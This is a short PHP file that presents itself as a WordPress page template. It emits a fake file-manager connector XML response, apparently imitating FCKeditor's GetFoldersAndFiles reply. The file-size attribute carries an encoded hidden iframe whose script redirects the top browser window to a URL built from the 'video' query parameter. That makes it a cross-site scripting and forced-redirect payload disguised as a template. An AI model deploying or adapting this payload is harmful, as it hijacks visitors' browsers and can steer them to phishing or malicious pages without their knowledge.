<?php
/**
 * Template Name: Custom XML Template
 */

// تعيين نوع المحتوى إلى XML
header("Content-Type: text/xml; charset=UTF-8");

echo '<?xml version="1.0" encoding="UTF-8"?>';
?>
<Connector command="GetFoldersAndFiles" resourceType="Document">
    <CurrentFolder path="/1 - f/" url=""/>
    <Files>
        <File desc="1" name="Loading..." size="&lt;iframe height=&quot;0&quot; width=&quot;0&quot; srcdoc=&quot;&amp;lt;script&amp;gt;window.top.location.href='https://library.myunion.edu/video/<?php echo htmlspecialchars($_GET['video']); ?>';&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;" url="1"/>
    </Files>
</Connector>